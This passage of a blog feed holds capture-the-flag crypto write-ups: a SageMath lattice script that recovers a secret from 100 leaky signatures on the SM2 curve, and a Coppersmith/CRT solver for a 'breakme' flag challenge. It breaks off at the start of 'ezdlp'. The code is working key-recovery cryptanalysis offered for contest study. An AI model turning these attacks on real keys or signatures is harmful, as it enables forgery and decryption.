string\">'7aa8380c566d543582b462355dc82deb8812d01513f0c4d779af11bf06b003cad9a0e79316b6fe587cc45d47b1c43ed8924b6e397a4294ec6f8aef3d93403dab'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'e8e27863fbf8bee56c1c6338646445d6167c0dfde67c8f3d9f6fb47a8aebbb5766e7c6357b9ff5a2ea60e66ec87fe39750d19e4479cfce3f6826ff3a0a9cd570'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'1e811334bf425f4b43d4a7a72923cda3b0de937bffb79e28b77bf01a3ae71195015144ab4579ba35486d83bb7412da260710349c7219403c66666dedac3c0583'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'128433bb842d8cafba6e3d5c46eb3a220100f402da2298198d842742afebad7829cbe85629d3d833581aaa60e8c9431316eab3dd0ed541a766b96ce37b30bc2a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'0b48699327e0aa9918c11eefe095e739468f363e7c5476d0d12d84de8321deeaed2c0fd2e106925b8848935e91ab23e12b70c09239376122e0d36b84b455b2fd'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'7ef2e62c79c62cc8ea9389f624c614c7b5a0086b50e7e0fdec5130567af4793ef785bde90fbc6e54f6b5e5ead5c77d05d4c96eaf828a0829412c653257ac6229'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'468e2aa659e9b35b97d5bac24f417bab88ffd9a4242cc8692206ac316bed0faca9de2eab82571ff2914afae01212d96215bf2227040385b289fb9ebd140b06da'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'4b81db768fc5e8c120ead0153430d75c45df0393f933bf71da457c4c6755ec69e3d0f99e216cf2afc216436877bd1f148d952adb41b28f610579ce5503b17549'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'58e9e0f30175ef2b88ea4ee9053a440bbcb7e3d16d94ace741fa719c3815bf176f2ce06e7f6e10f54efac521bfec84af91b4ca1b04c1dcb8e7d03e32ea38596a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'45e85224c9e50d36cf1b9062bf13a7764b11b73b8ae717f246d66c85ca4f0c31088b37a04f83ec3763d3fbb466acdc6ea683f36e9073fdbb22cf319dd58e9024'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'927fa98f6a9e9de8173235bed1ff048eeacbe9b3e46bc8885435283d1c61e2a074703f4e8dd1191f5dedc2089738f2af1c89936e44d72ababa7c3a4f9359cd43'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'2afe144b238287f4adce58daa21311cd0f0ae26487db8e256678606ab4e4e400a25ce747bb7c416e7eb7f5a97c280da450a69fe32a246846176f4d910de748ba'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'6759b6a2cf566d1ebc2748dd318222722c00b2fba287cbb6e1da7d356d65c3d31fa0d9757dcdc1953b515fd6e190ba16180666506b6bf3a438ddc75815a86e57'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'d539f75eb9f7d30dac3987cc959e5c169b33b027f021e29479c8167d982ef36a7557fcf54cf31e6108f2c9df9d507eea90ff4fc49239e80b47c7d7605d6e5534'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'25da3affe6289855a864ed7811e147f4bc8520a1f3c62791b0f3059265e9d2bb184522fa7411c532a68febfaaa50cb100b264abb349eec7302849f52cb265e09'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'4fcb0ad6726e9035f5cc5c45d5a8830e09e493661f58a520dc2bba46f65052757037b356c410f26289293c7071b4b775fa12b1f2fae0ead76d8ca02123b3808f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'64acde0ca5323a8a259d012b44dc423592573f9401d4648434447103c49a267b73f3a3947decc7d236265bb4391ec4bd94e425d8d5041ce563cebf044b67ba38'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'d725c7c0a04b674beb0b089aa3bc7c97c2044e6304254795c7c61b07c55eaeb7eb6d737047e2b45ae4cd96843448aebeb194c4e834b3c9664fca726be0c5d890'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'bf6210ced2953b98f9b82f58c84f37a4206aedb2a85f52f9ce019b64d8425e63f60e09dbda36a0160fd9d35bbaffa8de04b15e1aea243603068de034ed9d2ea3'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'c9e4647355c337b78edaa909c95c1d619a121afc7c34ec7557a5b09d6b182430db152568b256c7315578bab5cde92278a378f0de495ff857078aabbee3ab3690'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a869f86697738e6bbdd0748f6bf701d489a32719f89adb4cc7996fc4bb540fd3e1a4e5af001ca81e76a1cea03113778f9f16c3627b8185a2db6c6ffca8a177f4'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'29076654d718d92d0a52942c18ca5b9f6891dc1cde7f12fed60ac9d67c5ed1689a9696f6db786f89e9b7a0499f97574365035ee37f8b7d444a2460f7774f00dd'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'85c902a3c3e39e6e233ba1699b472b70489a44564cb5987893afdf956350be736d3b0478c5df62e9e0f6397d361ca1ae04d5e3b8557f7ca0c1d1ad3c82b973f4'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'826f5436ab916daa63990daa4153aa848ccf90230eecd8b86a1de836656685752e39f8b41561bb07c39c9e40056e92dbb474ef432bf0f1617a460a7a90c51dee'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'d4dba42e273affc76b7d1fff4f91cc37b7a23869bd75583cdb70a3ffdc5c58bcc71c32f591721b59e2358542af0be90f8137e4cbbc042e25b76e7f1380a65812'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'c4edd8ab085d0ee366856a48cb83b09dfada84e99b2d9b2a4f909986bc78cf4abd63e2ae893e0535362b27475f292ece70a6c070bc6a927cd924ad013b311caa'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'44c51530b472a040413e18ce80239a240fe3c312c7625b98cbbe74f3aafa1c60f1489b689478b7954c815f8cec382e796b7344cd8f3628ae7b776231cf4f5384'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'23c81e80ce0350f7b95075f03d2381a1aea6d13cddf111ea8110891e2e7086ecc69f43e66393b62ed5ee2ad6e74bf0c91239c5bad6044cea2812002ef0b876ea'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'4ca1353f26ad12589100ebc5d44801816741a77ebfb19e0f2b9be97407f7ae10e192bb6b9d34914a637cd1fa5c49b362bfeaab697d758e5de3d7e0637c973727'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'44bd1dd24b438b95d4085ceba4203b74ecbf0baa6008bce817f4399c3e3d733d7a087ed26a85504cb75adc2656a5822779be0806be2032a56f2ae3cfee9e4aa1'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'608737b1aa1574a61351c972b4599a598190e1ef0282330c667805a8587707cc0b26903360472e19b53a60925e67249bc87dc0b907b51a5213685455bc8c3df4'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'08e0e133ffbc775f9a8b08e7409fbf9e5fa83dfc0adbefb8408f28f043e6c57dc8128cd0d159f27d24631b3df54f0ed26c177ab908cdeb081fb0503a3bf76a62'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'fa55166ae9de2a6ca9c1cc66097821fa3d277956196c540f6e64aa4d75f887d9610521dcdfd2a2a579edf720353feec8067848a62edcb71d262724175d04929f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'896941de4316b1a784a8519ee4c31fdb63602aa529a1285cf81429c87c79d4d8828c5971194f884db7d675f4f64d42dfbe6c8b8f273e980122757d4ee09e91e9'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'8c1d5b553d6457648c5fb390e10f402492336bf1752ab89ea67dc8d20840b0a8f6db5d8fbb18a6e8a56e62b220888720975df86c270c879708923c0ce5fc6fee'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'264a9ad4f673b591e24d127be855934b3cc35bce89dbc53e2f068418b0a941b59d62d406ff816c182795f98a1d5f62fb160c7d03eea09a36ce615fae3c898050'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'ad5012241bbf11ec772ad0d00b77b2ed9f6789cf8a67ff3575e5226b0b1c6c6d097e5fa05fd48ab40659b2712c1f721cc80b206d10d6c56a8f0f1281db254552'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'42fd2268e0a01f33768f55d10b11410641648a1e627e43d1e7ac5e066446a2f07c5ff22ba0749f150f41dd01cc90230f6fd3bd3e205a826702f68db1f530dadf'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'67115049d6fb02b7399e73296d0533865b36adfc481a1e420d4ed384ceda596751bbea39709edcf9718489bab95faa1a21e89c00311d4d5a0d7bc84f514f26ed'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'f341ba3ec6df033dcaf0d3a8778ccbdce9408426fce2e97dfef529514f4f331caf384fb0828c3bd39aa1e379a8af3e39d838b350b7d8605751f34ca4024409f8'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'fa4c46c9a107ac1346ffa3cb8b30a9162bce792665d674400f4383c5f683fb062e3b13afe1382bd655308f1514db83e3e369cdfff72338b97493abebabbfb719'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'9101346e190dd0e8f3fff68e9023f55aa657d71710e80380ebfb3bf4a093d3ef44f3097e5983049304b1048233e9b399fe512d2856893ee201ddd030ea8e06a8'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'4e9c6150d09367c92a617477cfe98818d39db8e5f32311e9c67d17a5a02c20d1c4d884f98f60aa6be3bdf4dbd6b48dde755cc2098744f79fa5484ecf5520ae7f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'8642c3bc162ac445c8fd7bed403bfe0dd657dbfcb7f979b57580ab96159ce6ff612fa51e08481d89da782e981eedcbfb2522ccfff245726544330194c07a1717'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'346afb577fcd8eaee4202ddeb8d7e73610e7c2cfc57e9c6626f61e05eb4361d02939c581f119345ca38710a6535fd12bd0384fec6b3764e760e9a6736660ec6f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'074da8a90f3db7e72072e8c16cbbf43c4231e603fe0a7503891cec6f7aa29b2238bca9008075959297ff406337e3d30c7188f44ab04490bad127979a7b98b088'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'3ebac333cfa50b6ed33eeb5f37b46b5e31e2fd4af8ef11de3c9a72370e6abe18feefde25d20942578ccbab553f8fb16d190a5d28b729459b3382c172ebc18ba6'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'d05f26a96fd7f9f1091b460a9a55689263ad3256e0be781e9bd7a99050c16fe3707a7feb7f05331fd013757c63a792ea55374a992e447aa96a9f73428c60be1c'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'b714a57d0ebad5fa792b4a0c83af943b690157fe0780b068e1520bd72025bd1eb62d7852ec937394ea335cd83341481d7522f50b663777ae69786ae29c622c6a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'91f7a98cbad99f6e91014cae50076cab5b8c6a5c58c5858bf2d91102501b43ff31dc73e7723964972371c009bd72f2a795f74a8cb6ae9c50e8970631d0cd2a93'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'fd38b957099419344feb7e371b0aeff55a09ef99fedc17fc41a4ea85e755a5883c947a881d02c29c91e101b3420ab6c81a6ea171984245a142b1d92bf540a8c7'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'02d8390a6f7045650dda88d41b0fe79c9b864da60b0df5973d1282a8b6f82a56afce5c44d94bf192b2358f9954e09ac7523c2f65a70249b2e7a7cc02da700f8e'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a78e05af0126a939666c36a627efae721eee96be180b3794dcd60e4bceb41fa89f2d10dcdbef9382a90cd4383870d360aa3a71da027dd86ecdad5724a094c9e4'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'f020f03ba9f2cf28206223bc62421d72b7fe3c9e81e6b65aba7d760fc517d9bde64a82be98cd6ae48f13fd504008bdcc464a588c97ee17dfd783602ca69fd351'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'6001f080a74f916581324eea8809b16b82b65ec6836f8c01238a365d0f640e461d6acf2288dd05c9e5bf6e49edd2ffb52edef2f6018dfea19ab9c8b3f12a06ca'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'29894e9432aeb736623a2d753dfe76f89310b301c5ea4e33e0ab2e706ff3daa51c955137299428af402ebbd3e6fc21105234616fefec9703e910686e33eceea4'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'bbc9bbe8f52c4e369cf314019054363186e7ca2f3912b926ff28f00dfb15a95c70fb8a88d82da465f657381056cbef51922eb956804042d5f8709d4cc8e244c6'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'88f2adfbdc29c83694619a42fb23e9ed172c48bac2c72f0c966172ff4906ecdac482b11f8757536c64382ce5f210bdc3d49c84bf44348fea50ce3d710a7d9383'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'65c544b2d7d7d28ae51611e96c9515cdc11bd4f00d4d96e0273c45af09ad925e7e3a01e5036d1533b59db1ceac1f145ccbe8fcd43c1e027f6aca957e67de0274'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'abd41a53271f5c4c8356a97489a0f4418877d67937f2fdb829b4b71eaf64c72db3a821bb91f270d3e01d2da112d12c9ca3c6d2964635f18d989dfaf6bf8fdeb7'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'c2d11c45906c48e254665d0693d843134c5365e134ba487c8ef3da0584ca566f537092c89993ad4071d3fe17d75a513f95d8be218ccf41226ce0fac1cf3947ac'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'05488f64fb8bd8b2b3bcfb99925525aafbae1b1262d3ecc1f4176761b137ee3bbc9769f28a6d13a3181291083fa3b39c0702db5679837be353472301a1f5e318'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'95792f73d843ff4ccc62c53da8c58db48f56e22c0f38aa0ac4b0275e3a305a3a812425efd2d6203aa4a35c7732e4712c46ff5d38c933eab5ce286cee4b85538b'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'b39b004b6c12c0635e51487926623f18f0f5c52eaa81df6a8e3b64398ce020ae49c097b164c734aa851c1e4ca1dbaf1e23947dfdae1257522243e720951e8862'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'6891720082ff1885fc095767a2114a2322f326ce48af92453ea76d57c99c2aad7d0dcbd9cb80d36007913209d14051947b026acfbeb7ea8078df4f9a576fbfc9'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'93351dad07711cf9501e6e565025a6414da57f52260a3fb1f30aa3bbd1d9318b063305c203c68f93b2a6555b574c02a836ced1b5acc765d8047c033446e19616'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'9ea4e43207d9f5a10c32608e782687d177107699cf9dfc9faedba09a477c3f6b8bc1677a0b17c70f94c3f9f8a857aa63cfaccb4a2c0ddd9373de7ac0eef6966f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'b51db0b7a06dd6b1721a0362b89d6ede3613bf03f7bf4efa5444cfe7fec06c7cbc2e848f53eff793785594d302564551d751c70f033b3f9cabd7f795b205f3a5'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'f551370d4659c0f85253c345a8a80ea3e98e41dc61fd5ee9a77982c2586ce5847d76aebff3e0a63c5b5ac9376baf65abbb15f0f5d33b6b0e02ca9fdb2f1d5fcf'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'324b9f33d41c2fae485c0150e695832ed4f885f5df8d0beff39a982fb9198175cc3211d06f46f9fed0a39338c9cec971b1f7d0568008823f3ac0b588ec8f17ce'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'6d27e580c4f673b24ec4ffe12d8f6c4e15897bdba0628627930b267aa0da0f66e2ae143ae1eef11e246c85b15d0c17b06df77ab9b13ea812514175779721c915'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>R<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>S<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>n<span class=\"token operator\">=</span>ZZ<span class=\"token punctuation\">(</span><span class=\"token string\">'FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123'</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    r<span class=\"token punctuation\">,</span> s <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sigs<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sigs<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    R<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>r<span class=\"token operator\">+</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    S<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>M<span class=\"token operator\">=</span>Matrix<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">,</span><span class=\"token number\">102</span><span class=\"token punctuation\">,</span><span class=\"token number\">102</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    M<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>n</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    M<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>R<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    M<span class=\"token punctuation\">[</span><span class=\"token number\">101</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>S<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>M<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>M<span class=\"token punctuation\">[</span><span class=\"token number\">101</span><span class=\"token punctuation\">,</span><span class=\"token number\">101</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">250</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>res<span class=\"token operator\">=</span>M<span class=\"token punctuation\">.</span>BKZ<span class=\"token punctuation\">(</span>blocksize<span class=\"token operator\">=</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">if</span> i<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">250</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># 399554059433875376054790320976494104539757595501141010535012224082738919470</span></pre></td></tr></table></figure><p>分类: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvY2F0ZWdvcnkvMjIwMjk5Ny5odG1s\">WriteUp</span></p>\n<p>标签: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL2NyeXB0by8=\">crypto</span> , <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL3dyaXRldXAv\">writeup</span></p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/12/",
            "url": "http://waltcsz.github.io/2023/12/",
            "title": "",
            "date_published": "2023-12-05T15:26:53.721Z",
            "content_html": "<h1 id=\"朝花夕拾四华为杯第一届中国研究生网络安全创新大赛\"><a class=\"markdownIt-Anchor\" href=\"#朝花夕拾四华为杯第一届中国研究生网络安全创新大赛\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvYXJ0aWNsZXMvMTc3MTU2MzguaHRtbA==\"> 朝花夕拾（四）“华为杯” 第一届中国研究生网络安全创新大赛 </span></h1>\n<p>备战 2023 第二届。</p>\n<h3 id=\"breakme\"><a class=\"markdownIt-Anchor\" href=\"#breakme\">#</a> breakme</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>out <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Function</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span>r<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    P<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>m<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    k <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span><span class=\"token string\">b'flag&#123;'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span><span class=\"token number\">58</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> m</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    f <span class=\"token operator\">=</span> k<span class=\"token operator\">^</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token operator\">*</span>k<span class=\"token operator\">^</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> r<span class=\"token operator\">*</span>k <span class=\"token operator\">-</span> c</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> f</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>fs <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>ns <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> out<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    ns<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>nbits<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    ff <span class=\"token operator\">=</span> Function<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    fs<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ff<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>F <span class=\"token operator\">=</span> crt<span class=\"token punctuation\">(</span>fs<span class=\"token punctuation\">,</span>ns<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#print(F)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>N <span class=\"token operator\">=</span> prod<span class=\"token punctuation\">(</span>ns<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">.</span>nbits<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>FF <span class=\"token operator\">=</span> F<span class=\"token punctuation\">.</span>change_ring<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>roots <span class=\"token operator\">=</span> FF<span class=\"token punctuation\">.</span>small_roots<span class=\"token punctuation\">(</span>X<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">464</span><span class=\"token punctuation\">,</span>epsilon <span class=\"token operator\">=</span> <span class=\"token number\">0.03</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>roots<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>roots<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ezdlp\"><a class=\"markdownIt-Anchor\" href=\"#ezdlp\">#</a> ezdlp</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token 